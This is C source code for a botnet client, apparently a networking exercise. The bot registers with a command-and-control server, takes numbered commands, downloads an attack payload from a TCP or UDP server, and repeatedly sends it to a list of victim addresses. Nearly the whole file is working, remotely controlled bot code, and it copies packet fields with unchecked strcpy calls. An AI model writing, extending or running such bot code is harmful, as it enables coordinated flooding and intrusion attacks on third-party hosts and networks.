#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/shm.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>
#include "wrapper_functions.h"
#include "msg.h"

#define PAYLOAD_MAX 1024+1

int id;
int *run_process_on;

void delete(int sig)
{
	(void) shmdt((char *)run_process_on);
	(void) shmctl(id, IPC_RMID, NULL);
	exit(0);
}

void usage()
{
	fprintf(stderr, "Usage: ./bot ip port\n");
	exit(1);
}

void parse_packet(struct msg *message, char *packet, int bytes_recv)
{
    int i = PORT_LEN + ADDR_LEN;

    int counter = (bytes_recv - 1)/i;

    message->command = *packet++;    

    for(i = 0; i < counter; i++){
        
        strcpy(message->entry[i].ip_address, packet);
        packet += sizeof(message->entry[i].ip_address);

        strcpy(message->entry[i].port_number, packet);
        packet += sizeof(message->entry[i].port_number);

    }

    message->number_of_pairs = counter;
}

void reg(int sockfd, char *ip, int port)
{
	char *packet = "REG\n";
	struct sockaddr_in addr;
	struct addrinfo hints, *res;
	
	printf("Registering on CandC server...\n");
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	
	w_getaddrinfo(ip, NULL, &hints, &res);
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
	
	w_sendto(sockfd, packet, strlen(packet), 0, (const struct sockaddr *)&addr, sizeof(addr));
	
	printf("Bot registered on CandC server.\n");
	
	return;
}

void quit(int pid)
{
	printf("Received QUIT from CandC server.\nQuitting...\n");
	if(pid != 0)
		kill(pid, SIGTERM);
	exit(0);
}

void prog_tcp(char *ip, int port, char *payload)
{
	printf("Connecting to TCP server...\n");
	
	memset(payload, 0, PAYLOAD_MAX);
	
	char *packet = "HELLO\n";
	
	int sockfd = w_socket(AF_INET, SOCK_STREAM, 0);
	
	int broadcast_permission = 1;
	w_setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast_permission, sizeof(int));
	
	struct sockaddr_in addr;
	struct addrinfo hints, *res;
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	
	w_getaddrinfo(ip, NULL, &hints, &res);
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
	
	w_connect(sockfd, (const struct sockaddr *)&addr, sizeof addr);
	
	w_send(sockfd, packet, strlen(packet), 0);
	
	w_recv(sockfd, payload, PAYLOAD_MAX, 0);
	
	printf("Received payload.\n");
	printf("Payload is: %s\n", payload);
	
	close(sockfd);
	freeaddrinfo(res);
	
	return;
}

void prog_udp(char *ip, int port, char *payload)
{
	printf("Connecting to UDP server...\n");
	
	memset(payload, 0, PAYLOAD_MAX);
	
	char *packet = "HELLO\n";
	
	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
	
	struct sockaddr_in addr;
	struct addrinfo hints, *res;
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	
	w_getaddrinfo(ip, NULL, &hints, &res);
	
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
	
	w_sendto(sockfd, packet, strlen(packet), 0, (struct sockaddr *)&addr, sizeof addr);
	
	memset(payload, 0, PAYLOAD_MAX);
	
	w_recvfrom(sockfd, payload, PAYLOAD_MAX, 0, NULL, NULL);
	
	printf("Received payload from UDP server.\n");
	printf("New payload: %s", payload);
	
	close(sockfd);
	freeaddrinfo(res);
	
}

void run(int sockfd, struct msg message, char *payload)
{
	struct timeval time;
	time.tv_sec = 0;
	time.tv_usec = 0;

	fd_set master;
	fd_set read_fds;
	int fdmax;
	FD_SET(sockfd, &master);
	fdmax = sockfd;

	printf("Starting the attack...\n");
	printf("Payload: %s\n", payload);
	
	for(int time = 0; time < 100; ++time){
		
		char tmp[PAYLOAD_MAX];
		strcpy(tmp, payload);
		
		char *str = strtok(tmp, ":");	
		
		while(str != NULL){	
			for(int i = 0; i < message.number_of_pairs; ++i){
				read_fds = master;
				char buf[PAYLOAD_MAX];

				struct addrinfo hints, *res;
				
				memset(&hints, 0, sizeof(hints));
				hints.ai_family = AF_INET;
				hints.ai_socktype = SOCK_DGRAM;
				
				w_getaddrinfo(message.entry[i].ip_address, message.entry[i].port_number, &hints, &res);
				
				socklen_t addrlen = res->ai_addrlen;
				w_select(fdmax+1, &read_fds, NULL, NULL, &time);
				if(FD_ISSET(sockfd, &read_fds)){
					if((w_recvfrom(sockfd, buf, PAYLOAD_MAX, 0, res->ai_addr, &addrlen)) > 0){
						printf("Received something from victim.\n");
						freeaddrinfo(res);
						return;
					}
				}

				w_sendto(sockfd, str, strlen(str), 0, res->ai_addr, res->ai_addrlen);
				
				freeaddrinfo(res);
				
			}
			str = strtok(NULL, ":");
		}
		sleep(1);
	}
}

void stop(int pid)
{
	if(pid != 0)
		kill(pid, SIGTERM);
	
	*run_process_on = 0;
	return;
}

int main(int argc, char **argv)
{
	id = shmget(IPC_PRIVATE, sizeof(int), 0600);
	run_process_on = (int *) shmat(id, NULL, 0);
	*run_process_on = 0;
	
	sigset(SIGINT, delete);
	
	printf("%d\n", *run_process_on);

	if(argc != 3) usage();
	
	char *candc_ip = argv[1];
	int candc_port = atoi(argv[2]);
	
	struct msg message;
	memset(&message, 0, sizeof(message));
	
	char payload[PAYLOAD_MAX];
	memset(payload, 0, PAYLOAD_MAX);
	
	char packet[PAYLOAD_MAX];
	memset(packet, 0, PAYLOAD_MAX);
	
	int sockfd = w_socket(AF_INET, SOCK_DGRAM, 0);
	
	reg(sockfd, candc_ip, candc_port);
	
	int prog_flag = 0;
	int pid = 0;
		
	while(true){
		
		int bytes_recv = w_recv(sockfd, packet, PAYLOAD_MAX, 0);
		
		parse_packet(&message, packet, bytes_recv);
		
		memset(packet, 0, PAYLOAD_MAX);
				
		switch(message.command){
			case '0':
				quit(pid);
			case '1':
				prog_tcp(message.entry[0].ip_address,
						atoi(message.entry[0].port_number), payload);
				prog_flag = 1;
				break;
			case '2':
				prog_udp(message.entry[0].ip_address,
						atoi(message.entry[0].port_number), payload);
				prog_flag = 1;
				break;
			case '3':
				if(prog_flag && (*run_process_on) == 0){
					*run_process_on = 1;
					if((pid = fork()) == 0){
						run(sockfd, message, payload);
						*run_process_on = 0;
						exit(0);
					}
				}
				else
					printf("Cannot run, no prog received.\n");
				break;
			case '4':
				stop(pid);
				break;
			default:
				fprintf(stderr, "Unknown command from CandC server.\nExiting...\n");
				exit(1);
		}
	}
	
	close(sockfd);
	
	delete(0);
	return 0;
}